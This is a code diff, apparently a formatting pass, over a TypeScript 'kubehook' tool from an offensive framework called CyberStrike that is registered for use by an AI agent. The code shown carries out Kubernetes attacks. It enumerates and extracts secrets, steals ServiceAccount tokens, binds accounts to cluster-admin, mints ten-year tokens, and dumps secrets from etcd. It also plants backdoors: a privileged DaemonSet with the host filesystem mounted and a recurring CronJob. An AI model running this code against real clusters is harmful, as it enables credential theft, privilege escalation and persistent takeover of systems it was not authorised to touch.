@@ -40,12 +40,25 @@ const PROGRAMS = {
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
-type Finding = { checkId: string; provider: string; severity: string; status: string; resource: string; title: string; details: string; remediation: string }
+type Finding = {
+  checkId: string
+  provider: string
+  severity: string
+  status: string
+  resource: string
+  title: string
+  details: string
+  remediation: string
+}
 type HookResult = { output: string; findings: Finding[] }
 
 // ── CLI helpers ──
 
-async function run(cmd: string, args: string[], timeout: number): Promise<{ stdout: string; stderr: string; exitCode: number }> {
+async function run(
+  cmd: string,
+  args: string[],
+  timeout: number,
+): Promise<{ stdout: string; stderr: string; exitCode: number }> {
   const proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
   const timer = setTimeout(() => proc.kill(), timeout * 1000)
   const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
@@ -59,7 +72,11 @@ function argVal(args: string[], flag: string): string | undefined {
 }
 
 function tryJson(s: string) {
-  try { return JSON.parse(s) } catch { return null }
+  try {
+    return JSON.parse(s)
+  } catch {
+    return null
+  }
 }
 
 function kc(args: string[], kubeconfig: string | undefined, ctx: string | undefined, timeout: number) {
@@ -88,7 +105,7 @@ async function k8sEnum(args: string[], timeout: number): Promise<HookResult> {
   if (whoami.exitCode === 0) output.push(`[+] Current identity:\n${whoami.stdout}\n`)
 
   const nsResult = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
-  const namespaces = nsResult.exitCode === 0 ? (tryJson(nsResult.stdout)?.items || []) : []
+  const namespaces = nsResult.exitCode === 0 ? tryJson(nsResult.stdout)?.items || [] : []
   output.push(`[+] Namespaces: ${namespaces.length}`)
   for (const n of namespaces) output.push(`    ${n.metadata.name} (${n.status?.phase})`)
 
@@ -111,7 +128,9 @@ async function k8sEnum(args: string[], timeout: number): Promise<HookResult> {
       const items = tryJson(svcs.stdout)?.items || []
       output.push(`  Services: ${items.length}`)
       for (const s of items) {
-        const ports = (s.spec?.ports || []).map((p: Record<string, string | number>) => `${p.port}/${p.protocol}`).join(",")
+        const ports = (s.spec?.ports || [])
+          .map((p: Record<string, string | number>) => `${p.port}/${p.protocol}`)
+          .join(",")
         output.push(`    ${s.metadata.name} (${s.spec?.type}) — ${ports}`)
       }
     }
@@ -120,7 +139,8 @@ async function k8sEnum(args: string[], timeout: number): Promise<HookResult> {
     if (secrets.exitCode === 0) {
       const items = tryJson(secrets.stdout)?.items || []
       output.push(`  Secrets: ${items.length}`)
-      for (const s of items) output.push(`    ${s.metadata.name} (${s.type}) — ${Object.keys(s.data || {}).length} key(s)`)
+      for (const s of items)
+        output.push(`    ${s.metadata.name} (${s.type}) — ${Object.keys(s.data || {}).length} key(s)`)
     }
 
     const sas = await kc(["get", "serviceaccounts", "-n", n], kubeconfig, ctx, timeout)
@@ -152,7 +172,7 @@ async function k8sEnum(args: string[], timeout: number): Promise<HookResult> {
       const subjects = (b.subjects || []).map((s: Record<string, string>) => `${s.kind}/${s.name}`).join(",")
       output.push(`    ${b.metadata.name} → ${b.roleRef.name} — ${subjects}`)
       if (b.roleRef.name === "cluster-admin") {
-        for (const s of (b.subjects || [])) {
+        for (const s of b.subjects || []) {
           if (s.name === "system:masters") continue
           findings.push({
             checkId: "K8S-ENUM-001",
@@ -180,7 +200,11 @@ async function k8sSecrets(args: string[], timeout: number): Promise<HookResult> 
   const output: string[] = ["[*] Extracting Kubernetes secrets...\n"]
 
   const nsResult = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
-  const namespaces = ns ? [ns] : (nsResult.exitCode === 0 ? (tryJson(nsResult.stdout)?.items || []).map((n: Record<string, Record<string, string>>) => n.metadata.name) : ["default"])
+  const namespaces = ns
+    ? [ns]
+    : nsResult.exitCode === 0
+      ? (tryJson(nsResult.stdout)?.items || []).map((n: Record<string, Record<string, string>>) => n.metadata.name)
+      : ["default"]
 
   let total = 0
   for (const n of namespaces) {
@@ -290,7 +314,10 @@ async function k8sPrivesc(args: string[], timeout: number): Promise<HookResult> 
   if (method === "sa_token") {
     output.push("[*] Stealing ServiceAccount tokens...\n")
     const nsResult = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
-    const namespaces = (nsResult.exitCode === 0 ? (tryJson(nsResult.stdout)?.items || []).map((n: Record<string, Record<string, string>>) => n.metadata.name) : [ns])
+    const namespaces =
+      nsResult.exitCode === 0
+        ? (tryJson(nsResult.stdout)?.items || []).map((n: Record<string, Record<string, string>>) => n.metadata.name)
+        : [ns]
     for (const n of namespaces) {
       const secrets = await kc(["get", "secrets", "-n", n], kubeconfig, ctx, timeout)
       if (secrets.exitCode !== 0) continue
@@ -311,28 +338,41 @@ async function k8sPrivesc(args: string[], timeout: number): Promise<HookResult> 
     output.push("[*] Creating cluster-admin binding...\n")
     const target = saName || "default"
     const bindingName = `cs-admin-${Date.now()}`
-    const create = await kcText([
-      "create", "clusterrolebinding", bindingName,
-      "--clusterrole=cluster-admin",
-      `--serviceaccount=${ns}:${target}`,
-    ], kubeconfig, ctx, timeout)
-    output.push(create.exitCode === 0
-      ? `[+] ClusterRoleBinding "${bindingName}" created — ${ns}:${target} is now cluster-admin`
-      : `[-] Failed: ${create.stderr.slice(0, 200)}`)
+    const create = await kcText(
+      ["create", "clusterrolebinding", bindingName, "--clusterrole=cluster-admin", `--serviceaccount=${ns}:${target}`],
+      kubeconfig,
+      ctx,
+      timeout,
+    )
+    output.push(
+      create.exitCode === 0
+        ? `[+] ClusterRoleBinding "${bindingName}" created — ${ns}:${target} is now cluster-admin`
+        : `[-] Failed: ${create.stderr.slice(0, 200)}`,
+    )
   }
 
   if (method === "token_request") {
     output.push("[*] Requesting token via TokenRequest API...\n")
     const target = saName || "default"
-    const tokenReq = await run("kubectl", [
-      "create", "token", target, "-n", ns,
-      "--duration=87600h",
-      ...(kubeconfig ? ["--kubeconfig", kubeconfig] : []),
-      ...(ctx ? ["--context", ctx] : []),
-    ], timeout)
-    output.push(tokenReq.exitCode === 0
-      ? `[+] Token for ${ns}/${target}:\n${tokenReq.stdout.slice(0, 80)}...`
-      : `[-] Failed: ${tokenReq.stderr.slice(0, 200)}`)
+    const tokenReq = await run(
+      "kubectl",
+      [
+        "create",
+        "token",
+        target,
+        "-n",
+        ns,
+        "--duration=87600h",
+        ...(kubeconfig ? ["--kubeconfig", kubeconfig] : []),
+        ...(ctx ? ["--context", ctx] : []),
+      ],
+      timeout,
+    )
+    output.push(
+      tokenReq.exitCode === 0
+        ? `[+] Token for ${ns}/${target}:\n${tokenReq.stdout.slice(0, 80)}...`
+        : `[-] Failed: ${tokenReq.stderr.slice(0, 200)}`,
+    )
   }
 
   return { output: output.join("\n"), findings: [] }
@@ -350,17 +390,23 @@ async function etcdDump(args: string[], timeout: number): Promise<HookResult> {
   output.push(`[*] Connecting to etcd at ${endpoint}...\n`)
 
   const check = await run("which", ["etcdctl"], 5)
-  if (check.exitCode !== 0) return { output: output.join("\n") + "[-] etcdctl not found. Install etcd client tools.", findings: [] }
+  if (check.exitCode !== 0)
+    return { output: output.join("\n") + "[-] etcdctl not found. Install etcd client tools.", findings: [] }
 
   const etcdArgs = [
-    "--endpoints", endpoint,
+    "--endpoints",
+    endpoint,
     ...(cert ? ["--cert", cert] : []),
     ...(key ? ["--key", key] : []),
     ...(ca ? ["--cacert", ca] : []),
   ]
 
   const health = await run("etcdctl", [...etcdArgs, "endpoint", "health"], timeout)
-  output.push(health.exitCode === 0 ? `[+] etcd healthy: ${health.stdout.trim()}` : `[-] Health check failed: ${health.stderr.slice(0, 200)}`)
+  output.push(
+    health.exitCode === 0
+      ? `[+] etcd healthy: ${health.stdout.trim()}`
+      : `[-] Health check failed: ${health.stderr.slice(0, 200)}`,
+  )
 
   output.push("\n[*] Extracting secrets from /registry/secrets/...")
   const secrets = await run("etcdctl", [...etcdArgs, "get", "/registry/secrets/", "--prefix", "--keys-only"], timeout)
@@ -408,13 +454,15 @@ async function k8sBackdoor(args: string[], timeout: number): Promise<HookResult>
         template: {
           metadata: { labels: { app: "cyberstrike", component: name } },
           spec: {
-            containers: [{
-              name: "agent",
-              image,
-              command: ["/bin/sh", "-c", cmd],
-              securityContext: { privileged: true },
-              volumeMounts: [{ name: "host", mountPath: "/host", readOnly: false }],
-            }],
+            containers: [
+              {
+                name: "agent",
+                image,
+                command: ["/bin/sh", "-c", cmd],
+                securityContext: { privileged: true },
+                volumeMounts: [{ name: "host", mountPath: "/host", readOnly: false }],
+              },
+            ],
             volumes: [{ name: "host", hostPath: { path: "/", type: "Directory" } }],
             hostPID: true,
             hostNetwork: true,
@@ -427,7 +475,11 @@ async function k8sBackdoor(args: string[], timeout: number): Promise<HookResult>
     await Bun.write(tmpFile, manifest)
     output.push(`[*] Deploying DaemonSet "${name}" to ${ns}...`)
     const apply = await kcText(["apply", "-f", tmpFile], kubeconfig, ctx, timeout)
-    output.push(apply.exitCode === 0 ? `[+] DaemonSet deployed — runs on every node with host access` : `[-] Failed: ${apply.stderr.slice(0, 200)}`)
+    output.push(
+      apply.exitCode === 0
+        ? `[+] DaemonSet deployed — runs on every node with host access`
+        : `[-] Failed: ${apply.stderr.slice(0, 200)}`,
+    )
   }
 
   if (type === "cronjob") {
@@ -446,11 +498,13 @@ async function k8sBackdoor(args: string[], timeout: number): Promise<HookResult>
             template: {
               metadata: { labels: { app: "cyberstrike", component: name } },
               spec: {
-                containers: [{
-                  name: "callback",
-                  image,
-                  command: ["/bin/sh", "-c", cmd],
-                }],
+                containers: [
+                  {
+                    name: "callback",
+                    image,
+                    command: ["/bin/sh", "-c", cmd],
+                  },
+                ],
                 restartPolicy: "Never",
               },
             },
@@ -463,7 +517,11 @@ async function k8sBackdoor(args: string[], timeout: number): Promise<HookResult>
     await Bun.write(tmpFile, manifest)
     output.push(`[*] Deploying CronJob "${name}" to ${ns}...`)
     const apply = await kcText(["apply", "-f", tmpFile], kubeconfig, ctx, timeout)
-    output.push(apply.exitCode === 0 ? `[+] CronJob deployed — runs every 30 minutes` : `[-] Failed: ${apply.stderr.slice(0, 200)}`)
+    output.push(
+      apply.exitCode === 0
+        ? `[+] CronJob deployed — runs every 30 minutes`
+        : `[-] Failed: ${apply.stderr.slice(0, 200)}`,
+    )
   }
 
   return { output: output.join("\n"), findings: [] }
@@ -473,7 +531,11 @@ async function cleanupK8s(args: string[], timeout: number): Promise<HookResult> 
   const kubeconfig = argVal(args, "--kubeconfig")
   const ctx = argVal(args, "--context")
   const dryRun = args.includes("--dry-run")
-  const output: string[] = [dryRun ? "[*] CLEANUP DRY RUN — no changes will be made\n" : "[*] Cleaning up CyberStrike Kubernetes resources...\n"]
+  const output: string[] = [
+    dryRun
+      ? "[*] CLEANUP DRY RUN — no changes will be made\n"
+      : "[*] Cleaning up CyberStrike Kubernetes resources...\n",
+  ]
   let cleaned = 0
 
   const resources = ["daemonsets", "cronjobs", "pods", "jobs"]
@@ -488,7 +550,9 @@ async function cleanupK8s(args: string[], timeout: number): Promise<HookResult> 
         output.push(`  [DRY] Would delete ${res}/${name} in ${ns}`)
       } else {
         const del = await kcText(["delete", res, name, "-n", ns], kubeconfig, ctx, timeout)
-        output.push(del.exitCode === 0 ? `  [+] Deleted ${res}/${name} from ${ns}` : `  [-] Failed: ${del.stderr.slice(0, 100)}`)
+        output.push(
+          del.exitCode === 0 ? `  [+] Deleted ${res}/${name} from ${ns}` : `  [-] Failed: ${del.stderr.slice(0, 100)}`,
+        )
       }
       cleaned++
     }
@@ -502,7 +566,11 @@ async function cleanupK8s(args: string[], timeout: number): Promise<HookResult> 
         output.push(`  [DRY] Would delete ClusterRoleBinding/${b.metadata.name}`)
       } else {
         const del = await kcText(["delete", "clusterrolebinding", b.metadata.name], kubeconfig, ctx, timeout)
-        output.push(del.exitCode === 0 ? `  [+] Deleted ClusterRoleBinding/${b.metadata.name}` : `  [-] Failed: ${del.stderr.slice(0, 100)}`)
+        output.push(
+          del.exitCode === 0
+            ? `  [+] Deleted ClusterRoleBinding/${b.metadata.name}`
+            : `  [-] Failed: ${del.stderr.slice(0, 100)}`,
+        )
       }
       cleaned++
     }
@@ -517,7 +585,11 @@ async function cleanupK8s(args: string[], timeout: number): Promise<HookResult> 
         output.push(`  [DRY] Would delete ClusterRoleBinding/${b.metadata.name} (cs-* prefix)`)
       } else {
         const del = await kcText(["delete", "clusterrolebinding", b.metadata.name], kubeconfig, ctx, timeout)
-        output.push(del.exitCode === 0 ? `  [+] Deleted ClusterRoleBinding/${b.metadata.name}` : `  [-] Failed: ${del.stderr.slice(0, 100)}`)
+        output.push(
+          del.exitCode === 0
+            ? `  [+] Deleted ClusterRoleBinding/${b.metadata.name}`
+            : `  [-] Failed: ${del.stderr.slice(0, 100)}`,
+        )
       }
       cleaned++
     }
@@ -571,7 +643,11 @@ export const KubehookTool = Tool.define("kubehook", {
         metadata: { program: params.program, findings: result.findings },
       }
     } catch (e) {
-      return { title: `kubehook: ${params.program}`, output: `Error: ${e instanceof Error ? e.message : String(e)}`, metadata: { program: params.program, findings: [] } }
+      return {
+        title: `kubehook: ${params.program}`,
+        output: `Error: ${e instanceof Error ? e.message : String(e)}`,
+        metadata: { program: params.program, findings: [] },
+      }
     }
   },
 })
